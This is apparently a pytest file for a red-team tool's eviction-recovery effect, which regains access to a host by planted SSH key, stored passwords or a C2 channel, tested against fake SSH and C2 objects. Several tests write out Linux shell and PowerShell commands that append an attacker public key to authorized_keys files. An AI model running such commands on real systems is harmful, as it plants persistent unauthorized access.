"""reestablish — the eviction-recovery port: key, then password, then channel.

The order is the mechanism (a key survives the password rotation that evicted us;
the channel is the last door) and the honesty is the other half: every mechanism
ends in a real login, a re-arm that did not verify is still recorded as the
mutation it was (``installed=True``), and with no live channel this effect says
so instead of re-implementing the implant.
"""

import time

from tests.helpers import DEFAULT_COMP, FakeC2, FakeSSH, base_cfg, make_ctx
from tlaloc.effects import execute
from tlaloc.effects import reestablish as reestablish_mod
from tlaloc.effects.reestablish import account_order, key_candidates

FIXTURE = str(DEFAULT_COMP)
IP = "192.168.1.10"
WIN_IP = "192.168.1.20"

PUB = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKN0tlalocPUBLICKEYREDTEAM"
       " tlaloc@red01")


def _ctx(tmp_path, ssh, cfg=None, **over):
    cfg = cfg or base_cfg(limits={"spray_delay_sec": 0})
    ctx = make_ctx(tmp_path, cfg=cfg, comp_dir=FIXTURE, ssh=ssh, compfile=False,
                   **over)
    ctx.world.ensure_event_start()
    return ctx


def _keypair(tmp_path):
    """The reentry key pair the persist sshkey family leaves on red01."""
    key = tmp_path / "red_key"
    key.write_text("PRIVATE-KEY", encoding="utf-8")
    (tmp_path / "red_key.pub").write_text(PUB + "\n", encoding="utf-8")
    return key


def _silent_intel():
    """nakon with every credential fact taken away (an honest empty intel)."""
    from tlaloc.intel.nakon import NakonIntel

    class Silent(NakonIntel):
        def candidate_pairs(self, ip=None):
            return []

        def candidate_users(self):
            return []

        def candidate_passwords(self):
            return []

        def hints_for(self, ip):
            return {}

    return Silent(FIXTURE)


# --- planning --------------------------------------------------------------------

def test_dry_run_plans_without_touching_the_box(tmp_path):
    ssh = FakeSSH()
    ctx = make_ctx(tmp_path, comp_dir=FIXTURE, ssh=ssh, dry_run=True, compfile=False)
    result = execute("reestablish", {"ip": IP}, ctx)
    assert result.ok and "dry-run" in result.detail
    assert ssh.calls == []
    assert ctx.world.foothold(IP) is None


def test_account_order_starts_with_the_boxes_own_account(tmp_path):
    ctx = _ctx(tmp_path, FakeSSH())
    assert account_order(ctx, IP)[0] == "ubuntu"
    assert account_order(ctx, WIN_IP)[0] == "Administrator"


# --- mechanism 1: the key --------------------------------------------------------

def test_the_planted_key_comes_back_first(tmp_path):
    key = _keypair(tmp_path)
    ssh = FakeSSH().on("id -un", rc=0, out="ubuntu\n")
    ssh.reentry_key = str(key)
    ctx = _ctx(tmp_path, ssh)
    candidates = key_candidates(ctx, IP)
    assert candidates[0] == ("ubuntu", str(key))
    assert all(entry[1] == str(key) for entry in candidates)

    result = execute("reestablish", {"ip": IP}, ctx)

    assert result.ok, result.detail
    assert result.data["mechanism"] == "key"
    call = ssh.calls[0]
    assert call["cmd"] == "id -un"
    assert call["user"] == "ubuntu" and call["password"] == ""
    assert call["key_path"] == str(key), "the key rides the transport, not a shell trick"
    assert call["windows"] is False

    foothold = ctx.world.foothold(IP)
    assert foothold["user"] == "ubuntu" and foothold["kind"] == "user"
    assert foothold["key_path"] == str(key)
    assert ctx.world.valid_creds(IP)[0]["source"] == "reestablish:key"
    # a login is not a mutation
    assert ctx.world.artifacts(IP) == [] and ctx.world.restore_table() == []


def test_a_dead_key_falls_through_to_the_password(tmp_path):
    key = _keypair(tmp_path)
    ssh = FakeSSH()
    ssh.on(lambda call: call["key_path"] is not None, rc="raise")
    ssh.on(lambda call: call["key_path"] is None, rc=0, out="ubuntu\n")
    ssh.reentry_key = str(key)
    ctx = _ctx(tmp_path, ssh)
    ctx.world.add_cred("ubuntu", "boxpw-1", "seed", IP)

    result = execute("reestablish", {"ip": IP}, ctx)

    assert result.ok, result.detail
    assert result.data["mechanism"] == "password"
    assert ssh.calls[0]["key_path"] == str(key), "the key path is tried first"
    assert ssh.calls[-1]["key_path"] is None
    assert ssh.calls[-1]["cmd"] == "id -un"
    # the credential we hold for this box goes before intel's candidates
    assert (ssh.calls[-1]["user"], ssh.calls[-1]["password"]) == ("ubuntu", "boxpw-1")
    assert ctx.world.foothold(IP)["user"] == "ubuntu"


def test_a_held_password_comes_back_over_ssh(tmp_path):
    ssh = FakeSSH().on("id -un", rc=0, out="analyst\n")
    ctx = _ctx(tmp_path, ssh)
    ctx.world.add_cred("analyst", "Analyst1!", "seed", IP)

    result = execute("reestablish", {"ip": IP}, ctx)

    assert result.ok, result.detail
    assert result.data["mechanism"] == "password"
    call = ssh.calls[0]
    assert (call["user"], call["password"], call["key_path"]) == ("analyst", "Analyst1!",
                                                                 None)
    assert call["cmd"] == "id -un"
    foothold = ctx.world.foothold(IP)
    assert foothold["user"] == "analyst" and foothold["password"] == "Analyst1!"


# --- mechanism 3: the live channel is the last resort -----------------------------

def test_the_live_channel_re_arms_the_key_as_the_last_resort(tmp_path):
    key = _keypair(tmp_path)
    ssh = FakeSSH()
    ssh.reentry_key = str(key)
    c2 = FakeC2({"web01-1": {"seen_at": time.time(), "agent": "poseidon"}})
    # every SSH attempt before the re-arm fails; the verification that follows it
    # succeeds — which is the only thing that makes this a foothold.
    ssh.on(lambda call: not c2.tasks, rc="raise")
    ssh.on(lambda call: bool(c2.tasks), rc=0, out="ubuntu\n")
    ctx = _ctx(tmp_path, ssh, c2=c2)

    result = execute("reestablish", {"ip": IP}, ctx)

    assert result.ok, result.detail
    assert result.data["mechanism"] == "c2" and result.data["box_id"] == "web01-1"
    path = "/home/ubuntu/.ssh/authorized_keys"
    quoted = f"'{PUB}'"
    assert c2.tasks == [{"box": "web01-1", "command": (
        f"mkdir -p /home/ubuntu/.ssh; "
        f"cp -a {path} {path}.tlaloc-bak 2>/dev/null; "
        f"grep -qF {quoted} {path} 2>/dev/null || echo {quoted} >> {path}; "
        f"chmod 700 /home/ubuntu/.ssh; chmod 600 {path}; "
        f"chown -R ubuntu /home/ubuntu/.ssh 2>/dev/null; echo TLALOC_REARM")}]

    # the foothold is real: verified with the key over SSH, not assumed from the task
    assert ssh.calls[-1]["cmd"] == "id -un"
    assert ssh.calls[-1]["key_path"] == str(key)
    foothold = ctx.world.foothold(IP)
    assert foothold["user"] == "ubuntu" and foothold["key_path"] == str(key)

    artifact = ctx.world.artifacts(IP)[0]
    assert artifact["kind"] == "access-key-rearm" and artifact["paths"] == [path]
    restore = ctx.world.restore_table()[0]
    assert restore["effect"] == "reestablish" and restore["ip"] == IP
    assert restore["recipe"][0] == f"cp -a {path}.tlaloc-bak {path}"


def test_a_rearm_that_does_not_verify_is_still_recorded(tmp_path):
    key = _keypair(tmp_path)
    ssh = FakeSSH().on("id -un", rc="raise")         # attempts and verification alike
    ssh.reentry_key = str(key)
    c2 = FakeC2({"web01-1": {"seen_at": time.time(), "agent": "poseidon"}})
    ctx = _ctx(tmp_path, ssh, c2=c2)

    result = execute("reestablish", {"ip": IP}, ctx)

    assert result.ok is False and result.installed is True
    assert "not proven" in result.detail
    assert len(c2.tasks) == 1, "the re-arm really ran"
    assert ctx.world.foothold(IP) is None
    path = "/home/ubuntu/.ssh/authorized_keys"
    assert ctx.world.artifacts(IP)[0]["kind"] == "access-key-rearm"
    assert ctx.world.restore_table()[0]["recipe"][0] == \
        f"cp -a {path}.tlaloc-bak {path}"


def test_windows_rearm_uses_the_admin_key_list(tmp_path):
    key = _keypair(tmp_path)
    ssh = FakeSSH().on("whoami", rc="raise")         # the Windows probe, start to finish
    ssh.reentry_key = str(key)
    c2 = FakeC2({"dc01-1": {"seen_at": time.time(), "agent": "apollo"}})
    ctx = _ctx(tmp_path, ssh, c2=c2)

    result = execute("reestablish", {"ip": WIN_IP}, ctx)

    path = r"$env:ProgramData\ssh\administrators_authorized_keys"
    assert c2.tasks == [{"box": "dc01-1", "command": (
        f'Copy-Item -Path "{path}" -Destination "{path}.tlaloc-bak" -Force '
        f'-ErrorAction SilentlyContinue; '
        f'Add-Content -Path "{path}" -Value \'{PUB}\' -ErrorAction Stop; '
        f"Write-Output TLALOC_REARM")}]
    assert result.ok is False and result.installed is True
    assert ctx.world.artifacts(WIN_IP)[0]["paths"] == [path]


# --- give-up paths ----------------------------------------------------------------

def test_without_a_live_channel_this_names_implant_channel(tmp_path):
    ssh = FakeSSH().on("id -un", rc="raise")
    ctx = _ctx(tmp_path, ssh, c2=FakeC2({}))         # configured, but no callback
    result = execute("reestablish", {"ip": IP}, ctx)
    assert result.ok is False
    assert "implant_channel" in result.detail
    assert "no path back onto the box" in result.detail
    assert ctx.world.foothold(IP) is None
    assert ctx.world.artifacts(IP) == []


def test_a_stale_callback_is_not_a_live_channel(tmp_path):
    key = _keypair(tmp_path)
    ssh = FakeSSH().on("id -un", rc="raise")
    ssh.reentry_key = str(key)
    stale = time.time() - 10_000
    ctx = _ctx(tmp_path, ssh, c2=FakeC2({"web01-1": {"seen_at": stale,
                                                     "agent": "poseidon"}}))
    result = execute("reestablish", {"ip": IP}, ctx)
    assert result.ok is False
    assert "no live C2 channel" in result.detail
    assert ctx.c2.tasks == []


def test_check_rejects_a_box_with_no_recovery_material(tmp_path):
    ssh = FakeSSH()
    ctx = _ctx(tmp_path, ssh)                        # no C2, no key, no creds
    ctx.intel = _silent_intel()
    result = execute("reestablish", {"ip": IP}, ctx)
    assert result.ok is False
    assert "precondition" in result.detail
    assert ssh.calls == []
    assert ctx.world.reject_memory()


def test_too_many_failures_switch_the_box_off(tmp_path):
    cfg = base_cfg(limits={"spray_delay_sec": 0, "cred_spray_max": 1})
    ctx = _ctx(tmp_path, FakeSSH().on("id -un", rc="raise"), cfg=cfg)
    for _ in range(3):
        assert execute("reestablish", {"ip": IP}, ctx).ok is False
    assert ctx.world.failure_count("reestablish", IP) == 3

    ssh = FakeSSH().on("id -un", rc=0, out="ubuntu\n")
    ctx = _ctx(tmp_path, ssh, cfg=cfg)               # same state dir
    result = execute("reestablish", {"ip": IP}, ctx)
    assert result.ok is False and "precondition" in result.detail
    assert ssh.calls == []
